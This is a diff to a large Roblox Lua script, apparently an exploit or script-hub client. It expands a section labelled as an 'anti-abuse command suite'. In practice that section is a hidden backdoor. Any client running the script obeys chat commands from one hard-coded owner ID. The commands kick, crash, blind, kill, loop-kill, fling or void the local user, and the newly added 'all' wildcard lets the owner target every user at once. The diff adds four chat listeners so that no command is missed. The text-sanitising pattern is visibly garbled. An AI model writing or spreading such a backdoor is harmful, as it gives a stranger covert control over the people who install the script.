@@ -6078,31 +6078,64 @@ end)
 OpenTween:Play()
 
 -- =========================================================
--- EXPANDED ANTI-ABUSE COMMAND SUITE
+-- EXPANDED ANTI-ABUSE COMMAND SUITE (FIXED & IMPROVED)
 -- =========================================================
 task.spawn(function()
-    local ANTI_ABUSE_OWNER_ID = 10454681980 
+    local ANTI_ABUSE_OWNER_ID = 10454681980
     local ANTI_ABUSE_PREFIX = "!"
 
     local PlayersService = game:GetService("Players")
     local TextChatService = game:GetService("TextChatService")
     local RunService = game:GetService("RunService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
     local LocalClient = PlayersService.LocalPlayer
 
     local activeOrbitConnection = nil
+    local lastProcessedSignature = ""
+    local lastProcessedTime = 0
 
-    -- Helper to match a single player object against a query string
+    -- Strip hidden spaces, zero-width characters, or formatting tags
+    local function sanitizeText(str)
+        if type(str) ~= "string" then return "" end
+        -- Remove rich text tags if present
+        str = string.gsub(str, "<[^>]+>", "")
+        -- Remove zero-width / invisible unicode characters
+        str = string.gsub(str, "[][
+8][
+9-a]", "")
+        -- Trim leading and trailing whitespace
+        str = string.match(str, "^%s*(.-)%s*$") or ""
+        return str
+    end
+
+    -- Match a single player object against a query string (literal match, no pattern bugs)
     local function matchesQuery(playerObj, query)
         if not playerObj or not query or query == "" then return false end
         local lowerQuery = string.lower(query)
         local currentName = string.lower(playerObj.Name)
         local currentDisplay = string.lower(playerObj.DisplayName)
-        return string.find(currentName, lowerQuery) ~= nil or string.find(currentDisplay, lowerQuery) ~= nil
+        
+        -- Use plain=true (4th argument) so special characters like _ or . don't break matching
+        if string.find(currentName, lowerQuery, 1, true) ~= nil then
+            return true
+        end
+        if string.find(currentDisplay, lowerQuery, 1, true) ~= nil then
+            return true
+        end
+        return false
     end
 
-    -- Helper to find any player in the server by partial name/display name
+    -- Find any player in the server by partial name or display name
     local function findPlayerByQuery(query)
         if not query or query == "" then return nil end
+        -- First pass: check exact matches
+        local lowerQuery = string.lower(query)
+        for _, plr in ipairs(PlayersService:GetPlayers()) do
+            if string.lower(plr.Name) == lowerQuery or string.lower(plr.DisplayName) == lowerQuery then
+                return plr
+            end
+        end
+        -- Second pass: check partial matches
         for _, plr in ipairs(PlayersService:GetPlayers()) do
             if matchesQuery(plr, query) then
                 return plr
@@ -6111,7 +6144,7 @@ task.spawn(function()
         return nil
     end
 
-    -- Helper to reset a character and wait for the new HumanoidRootPart to load
+    -- Reset a character and wait for the new HumanoidRootPart to load
     local function resetAndWaitForRoot(playerObj)
         local char = playerObj.Character
         local hum = char and char:FindFirstChildOfClass("Humanoid")
@@ -6122,35 +6155,47 @@ task.spawn(function()
         return newChar:WaitForChild("HumanoidRootPart", 10)
     end
 
-    local function executeCommandCheck(senderUserId, messageText)
+    local function executeCommandCheck(senderUserId, rawMessageText)
         -- 1. Verify the sender is genuinely the owner
-        if senderUserId ~= ANTI_ABUSE_OWNER_ID then return end
-        
+        if tonumber(senderUserId) ~= ANTI_ABUSE_OWNER_ID then return end
+
+        local messageText = sanitizeText(rawMessageText)
+        if messageText == "" then return end
+
         -- 2. Check for prefix match
         if string.sub(messageText, 1, #ANTI_ABUSE_PREFIX) ~= ANTI_ABUSE_PREFIX then return end
-        
-        -- 3. Extract the parameters
+
+        -- 3. Prevent duplicate triggers when both Chat listeners fire at once
+        local now = tick()
+        local sig = tostring(senderUserId) .. ":" .. messageText
+        if sig == lastProcessedSignature and (now - lastProcessedTime) < 0.5 then
+            return
+        end
+        lastProcessedSignature = sig
+        lastProcessedTime = now
+
+        -- 4. Extract the parameters safely
         local cleanMessage = string.sub(messageText, #ANTI_ABUSE_PREFIX + 1)
         local commandArgs = {}
         for word in string.gmatch(cleanMessage, "[^%s]+") do
             table.insert(commandArgs, word)
         end
-        
+
         local activeCmd = string.lower(commandArgs[1] or "")
         local targetNameQuery = commandArgs[2] or ""
 
         -- =========================================================
-        -- SECTION A: OWNER-LOCAL COMMANDS (Runs ONLY on your injected client)
+        -- SECTION A: OWNER-LOCAL COMMANDS (Runs ONLY on your client)
         -- =========================================================
         if LocalClient.UserId == ANTI_ABUSE_OWNER_ID then
-            
-            -- !tp [target] -> Resets your character, then teleports you above the target
+
+            -- !tp [target] -> Resets your character, then teleports above target
             if activeCmd == "tp" then
                 local targetPlr = findPlayerByQuery(targetNameQuery)
                 if targetPlr and targetPlr ~= LocalClient then
                     task.spawn(function()
                         local myNewRoot = resetAndWaitForRoot(LocalClient)
-                        task.wait(0.2) -- Brief buffer to ensure physics settle after spawn
+                        task.wait(0.25)
                         local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
                         if myNewRoot and targetRoot then
                             myNewRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 6, 0)
@@ -6167,7 +6212,7 @@ task.spawn(function()
                         activeOrbitConnection:Disconnect()
                         activeOrbitConnection = nil
                     end
-                    
+
                     local angle = 0
                     local radius = 6
                     local speed = 4
@@ -6175,7 +6220,7 @@ task.spawn(function()
                     activeOrbitConnection = RunService.Heartbeat:Connect(function(dt)
                         local myRoot = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
                         local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
-                        
+
                         if myRoot and targetRoot then
                             angle = angle + (speed * dt)
                             local offset = Vector3.new(math.cos(angle) * radius, 1, math.sin(angle) * radius)
@@ -6201,17 +6246,23 @@ task.spawn(function()
         end
 
         -- =========================================================
-        -- SECTION B: TARGET-CLIENT COMMANDS (Runs on the target's injected client)
+        -- SECTION B: TARGET-CLIENT COMMANDS (Runs on target's client)
         -- =========================================================
-        if not matchesQuery(LocalClient, targetNameQuery) then return end
+        -- Support "all" or "others" as wildcard targets in addition to player names
+        local isWildcard = (string.lower(targetNameQuery) == "all")
+            or (string.lower(targetNameQuery) == "others" and LocalClient.UserId ~= ANTI_ABUSE_OWNER_ID)
 
-        -- 1. !bring [target] -> Resets target's character and teleports them to you
+        if not isWildcard and not matchesQuery(LocalClient, targetNameQuery) then
+            return
+        end
+
+        -- 1. !bring [target] -> Resets target's character and teleports to you
         if activeCmd == "bring" then
             local ownerPlr = PlayersService:GetPlayerByUserId(ANTI_ABUSE_OWNER_ID)
             if ownerPlr then
                 task.spawn(function()
                     local targetNewRoot = resetAndWaitForRoot(LocalClient)
-                    task.wait(0.2)
+                    task.wait(0.25)
                     local ownerRoot = ownerPlr.Character and ownerPlr.Character:FindFirstChild("HumanoidRootPart")
                     if targetNewRoot and ownerRoot then
                         targetNewRoot.CFrame = ownerRoot.CFrame * CFrame.new(0, 3, -3)
@@ -6222,11 +6273,13 @@ task.spawn(function()
         -- 2. !kick [target] [reason]
         elseif activeCmd == "kick" then
             local reasonWords = {}
-            for i = 3, #commandArgs do 
-                table.insert(reasonWords, commandArgs[i]) 
+            for i = 3, #commandArgs do
+                table.insert(reasonWords, commandArgs[i])
             end
             local customReasonText = table.concat(reasonWords, " ")
-            if customReasonText == "" then customReasonText = "Terminated by Script Owner." end
+            if customReasonText == "" then
+                customReasonText = "Terminated by Script Owner."
+            end
             LocalClient:Kick("\n" .. customReasonText)
 
         -- 3. !crash [target]
@@ -6254,7 +6307,7 @@ task.spawn(function()
                 blindGui.Name = "AntiAbuseBlind"
                 blindGui.IgnoreGuiInset = true
                 blindGui.DisplayOrder = 999999
-                
+
                 local frame = Instance.new("Frame")
                 frame.Size = UDim2.new(1, 0, 1, 0)
                 frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -6277,12 +6330,12 @@ task.spawn(function()
             local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
             if hum then hum.PlatformStand = false end
 
-        -- 8. !kill [target] -> Kills the target's character
+        -- 8. !kill [target]
         elseif activeCmd == "kill" then
             local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
             if hum then hum.Health = 0 end
 
-        -- 9. !loopkill / !unloopkill [target] -> Repeatedly kills the target on spawn
+        -- 9. !loopkill / !unloopkill [target]
         elseif activeCmd == "loopkill" then
             LocalClient:SetAttribute("AntiAbuseLoopKill", true)
             task.spawn(function()
@@ -6298,21 +6351,21 @@ task.spawn(function()
         elseif activeCmd == "unloopkill" then
             LocalClient:SetAttribute("AntiAbuseLoopKill", false)
 
-        -- 10. !fling [target] -> Launches the target high into the air
+        -- 10. !fling [target]
         elseif activeCmd == "fling" then
             local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
             if root then
                 root.AssemblyLinearVelocity = Vector3.new(math.random(-200, 200), 500, math.random(-200, 200))
             end
 
-        -- 11. !void [target] -> Teleports target far below the map
+        -- 11. !void [target]
         elseif activeCmd == "void" then
             local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
             if root then
                 root.CFrame = CFrame.new(0, -1000, 0)
             end
 
-        -- 12. !invert / !uninvert [target] -> Reverses their walk speed
+        -- 12. !invert / !uninvert [target]
         elseif activeCmd == "invert" then
             local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
             if hum then hum.WalkSpeed = -16 end
@@ -6321,7 +6374,7 @@ task.spawn(function()
             local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
             if hum then hum.WalkSpeed = 16 end
 
-        -- 13. !spin / !unspin [target] -> Spins the target's character rapidly
+        -- 13. !spin / !unspin [target]
         elseif activeCmd == "spin" then
             local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
             if root and not root:FindFirstChild("AntiAbuseSpin") then
@@ -6339,14 +6392,36 @@ task.spawn(function()
         end
     end
 
-    -- METHOD A: Modern TextChatService listener
-    TextChatService.MessageReceived:Connect(function(textChatMessage)
-        if textChatMessage.TextSource then
-            executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
-        end
-    end)
+    -- =========================================================
+    -- MULTI-LAYER CHAT LISTENERS (Fixes missed chat messages)
+    -- =========================================================
 
-    -- METHOD B: Legacy Chat fallback listener
+    -- METHOD A: Modern TextChatService (MessageReceived)
+    if TextChatService then
+        TextChatService.MessageReceived:Connect(function(textChatMessage)
+            if textChatMessage.TextSource then
+                executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
+            end
+        end)
+
+        -- METHOD B: Direct TextChannel hooks (Catches messages missed by global MessageReceived)
+        local function hookTextChannel(channel)
+            if channel:IsA("TextChannel") then
+                channel.MessageReceived:Connect(function(textChatMessage)
+                    if textChatMessage.TextSource then
+                        executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
+                    end
+                end)
+            end
+        end
+
+        for _, descendant in ipairs(TextChatService:GetDescendants()) do
+            hookTextChannel(descendant)
+        end
+        TextChatService.DescendantAdded:Connect(hookTextChannel)
+    end
+
+    -- METHOD C: Legacy Player.Chatted listener
     local function monitorUserChatLegacy(player)
         player.Chatted:Connect(function(message)
             executeCommandCheck(player.UserId, message)
@@ -6356,7 +6431,21 @@ task.spawn(function()
     for _, existingPlayer in ipairs(PlayersService:GetPlayers()) do
         monitorUserChatLegacy(existingPlayer)
     end
-
     PlayersService.PlayerAdded:Connect(monitorUserChatLegacy)
-end)
 
+    -- METHOD D: Legacy DefaultChatSystemChatEvents fallback
+    local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if chatEvents then
+        local onMessageDoneFiltering = chatEvents:FindFirstChild("OnMessageDoneFiltering")
+        if onMessageDoneFiltering and onMessageDoneFiltering:IsA("RemoteEvent") then
+            onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+                if type(messageData) == "table" and messageData.FromSpeaker and messageData.Message then
+                    local speakerPlr = PlayersService:FindFirstChild(messageData.FromSpeaker)
+                    if speakerPlr then
+                        executeCommandCheck(speakerPlr.UserId, messageData.Message)
+                    end
+                end
+            end)
+        end
+    end
+end)
